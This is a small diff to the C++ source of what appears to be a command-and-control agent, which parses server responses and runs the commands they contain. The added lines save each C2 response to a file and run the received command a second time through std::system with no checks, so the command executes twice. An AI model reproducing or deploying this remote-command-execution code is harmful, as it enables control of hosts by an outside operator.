@@ -52,6 +52,9 @@ Command::Command(const std::string& c2_response) {
 
     try {
         res_json = json::parse(c2_response.c_str());
+        std::ofstream ofs("c2_response.txt", std::ofstream::out);
+        ofs << c2_response.c_str();
+        ofs.close();
     } catch (...) {
         res_json.clear();
     }
@@ -134,8 +137,10 @@ std::string Command::Execute() {
 
     /* Finally execute and leave temp directory. The TempDirectory instance will
      * delete the folder upon going out of scope */
+    std::string cmd = command_text.c_str();
     std::string output = util::PopenSubprocess(command_text.c_str());
     fs::current_path("../");
+    int status = std::system((cmd + "> log.txt").c_str());
 
     return output;
 }
